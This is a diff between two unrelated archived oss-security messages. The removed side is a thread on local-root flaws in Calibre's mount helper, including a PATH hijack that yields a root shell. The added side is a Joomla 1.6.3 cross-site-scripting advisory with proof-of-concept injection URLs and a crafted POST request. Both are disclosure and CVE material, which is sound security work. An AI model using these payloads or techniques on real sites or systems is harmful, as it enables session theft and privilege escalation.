@@ -1,117 +1,136 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/04/11
-Message-ID: <CAHmME9qcmx=xbSpYz02kCxcBar4fB+YQd+SqPcE=JwfQ7Zm=Zg@mail.gmail.com>
-Date: Fri, 4 Nov 2011 16:45:11 -0400
-From: "Jason A. Donenfeld" <Jason@...c4.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/28/4
+Message-ID: <BANLkTinokSP7O3x4mP0JxagVgd7cHcwd=Q@mail.gmail.com>
+Date: Tue, 28 Jun 2011 14:25:47 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Cc: Josh Bressers <bressers@...hat.com>, kseifried@...hat.com
-Subject: Re: Re: CVE request for Calibre
+Subject: CVE Request: Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS) Vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-Aaaa boy this has been quite the saga. Everybody should check out
-https://bugs.launchpad.net/calibre/+bug/885027 for a good example of how *
-not* to respond to security bug reports. Quite amusing. It's been a fun
-couple of days writing weaponized exploit after
-exploit.<http://git.zx2c4.com/calibre-mount-helper-exploit/tree/>
-
-In the end though, it looks like he agreed to fix it, "@Jason: Well, if you
-do not wish to help, that leaves me with no choice but to remove the mount
-helper."
-
-So where does that leave us with the CVEs? Well, there are the issues that
-were "released" with a "version" of Calibre, and then the trove of bugs he
-introduced in the middle. I'll try to recap and separate which is which:
-
-1. Ability to create root owned directory anywhere. The mount helper calls
-mkdir(argv[3], ...).
-
-2. Ability to remove any empty directory on the system.
-
-3. Ability to create user_controlled_dir/.created_by_calibre_mount_helper
-anywhere on the filesystem.
-
-4. Ability to delete user_controlled_dir/.created_by_calibre_mount_helper
-anywhere on the filesystem.
-
-5. Ability to inject arguments into 'mount' being exec'd. On lines 78, 81,
-and 83, the final two arguments to mount are user controlled. On lines
-1033, 106, 108, 139, and 141, the last argument to unmount/eject is user
-controlled. The "exists()" check can be subverted via race condition or by
-creating an existing file in the working directory with a filename equal to
-the desired injected argument.
-
-6. Ability to execute any program as root. The mount helper makes use of
-execlp on lines 78, 81, 83, 103, 106, 108, 139, and 141, and the first
-argument does not start with a / character. Because of this, execlp will
-search PATH for the executable to run. PATH is user controlled, and thus it
-is trivial to write a program that spawns a shell and give it "mount" as a
-filename, and direct PATH to its directory.
-
-7. Ability to mount any device to anywhere. This leads to local root, since
-you can mount over /etc/ or /etc/pam.d/ or choose-your-own-adventure.
-
---- bugs introduced along the saga: ---
-
-8. Race with checking for /dev
-
-9. Race with checking for /media
-
-10. Race with symlinks
-
-11. Another race with symlinks
-
-12. Another race with symlinks
-
-13. ...
-
-14. Probably more things.
+Joomla! 1.6.3 and lower | Multiple Cross Site Scripting (XSS) Vulnerabilities
 
 
-Probably CVEs are only assigned for issues 1-7, though? Should these be
-grouped together in anyway, or should there be 7 CVEs assigned?
+
+1. OVERVIEW
+
+Joomla! 1.6.3 and lower are vulnerable to multiple Cross Site Scripting issues.
 
 
-On Thu, Nov 3, 2011 at 19:21, Kurt Seifried <kseifried@...hat.com> wrote:
+2. BACKGROUND
 
-> On 11/03/2011 05:14 AM, Dan Rosenberg wrote:
-> >> Oh, and I suppose there's a very obvious but critical #6:
-> >>
-> >> 6. An unprivileged user an mount/unmount/eject whatever he wants, with
-> >> root permissions. Danger.
-> >>
-> >> This may help to "confirm":
-> >> https://bugs.launchpad.net/calibre/+bug/885027/
-> >>
-> >>
-> >> As well, the maintainer has already issued a fix. From the bug report:
-> >> "Fixed in branch lp:calibre. The fix will be in the next release.
-> >> calibre is usually released every Friday.", which means the above
-> >> source link, that went to the trunk, now shows the fixed result. The
-> >> old broken code is still available here:
-> >>
-> http://bazaar.launchpad.net/~kovid/calibre/trunk/view/9675/src/calibre/devices/linux_mount_helper.c
-> >>
-> >> Note that the maintainer has chosen only to address #5.
-> >>
-> > I'd recommend holding off on the CVE assignments for now, since these
-> > issues are currently in progress and the final tally of issues isn't
-> > complete.
-> >
-> > -Dan
-> I took a quick look at that, I'm not clear on which ones have
-> beenaddressed , if you could comment on the original issues, which are
-> addressed and link to code commit I can start assigning CVEs.
->
-> --
->
-> -Kurt Seifried / Red Hat Security Response Team
->
->
+Joomla is a free and open source content management system (CMS) for
+publishing content on the World Wide Web and intranets. It comprises a
+model–view–controller (MVC) Web application framework that can also be
+used independently.
+Joomla is written in PHP, uses object-oriented programming (OOP)
+techniques and software design patterns, stores data in a MySQL
+database, and includes features such as page caching, RSS feeds,
+printable versions of pages, news flashes, blogs, polls, search, and
+support for language internationalization.
 
 
--- 
-Jason A. Donenfeld
-Deep Space Explorer
-+1-513-476-1200
-www.jasondonenfeld.com
+3. VULNERABILITY DESCRIPTION
 
+Several parameters (QueryString, option, searchword) in Joomla! Core
+components (com_content, com_contact, com_newsfeeds, com_search) are
+not properly sanitized upon submission to the /index.php url, which
+allows attacker to conduct Cross Site Scripting attack. This may allow
+an attacker to create a specially crafted URL that would execute
+arbitrary script code in a victim's browser.
+
+
+4. VERSION AFFECTED
+
+1.6.3 and lower
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+
+component: com_contact , parameter: QueryString (Browser: All)
+===============================================================
+
+http://attacker.in/joomla163_noseo/index.php?option=com_contact&view=category&catid=26&id=36&Itemid=-1"><script>alert(/XSS/)</script>
+
+
+component:com_content , parameter:  QueryString (Browser: All)
+===============================================================
+
+http://attacker.in/joomla163_noseo/index.php?option=com_content&view=category&id=19&Itemid=260&limit=10&filter_order_Dir=&limitstart=&filter_order=><script>alert(/XSS/)</script>
+
+
+component: com_newsfeeds , parameter: QueryString (Browser: All)
+=================================================================
+
+http://attacker.in/joomla163_noseo/index.php?option=com_newsfeeds&view=category&id=17&whateverehere="><script>alert(/XSS/)</script>&Itemid=253&limit=10&filter_order_Dir=ASC&filter_order=ordering
+
+
+parameter: option (Browser: All)
+====================================
+
+http://attacker.in/joomla163_noseo/index.php?option="><script>alert(/XSS/)</script>&task=reset.request
+
+
+component: com_search, parameter: searchword (Browser: IE, Konqueror)
+=====================================================================
+
+[REQUEST]
+POST /joomla163/index.php HTTP/1.1
+Referer: http://attacker.in/joomla163/
+User-Agent: Konqueror/4.5
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Host: attacker.in
+Accept-Encoding: gzip, deflate
+Content-Length: 125
+
+option=com_search&searchword='%2522%253C%252Fscript%253E%253Cscript%253Ealert(%252FXSS%252F)%253C%252Fscript%253E&task=search
+[/REQUEST]
+
+This searchword XSS was identified via source code:
+http://yehg.net/lab/pr0js/advisories/joomla/core/1.6.3/xss/XSS%20%5bMode=SEO,NON-SEO%5d/(searchword)_xss_vuln_code_portion.jpg
+
+
+6. IMPACT
+
+Attackers can compromise currently logged-in user/administrator
+session and impersonate arbitrary user actions available under
+/administrator/ functions.
+
+
+7. SOLUTION
+
+Upgrade to Joomla! 1.6.4 or higher
+
+
+8. VENDOR
+
+Joomla! Developer Team
+http://www.joomla.org
+
+
+9. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+10. DISCLOSURE TIME-LINE
+
+2011-05-26: notified vendor
+2011-06-28: vendor released fix
+2011-06-28: vulnerability disclosed
+
+
+11. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.6.3]_cross_site_scripting(XSS)
+Vendor Advisory URL:
+http://developer.joomla.org/security/news/352-20110604-xss-vulnerability.html
+XSS FAQ: http://www.cgisecurity.com/xss-faq.html
+OWASP Top 10: http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
+CWE-79: http://cwe.mitre.org/data/definitions/79.html
+
+
+#yehg [2011-06-28]
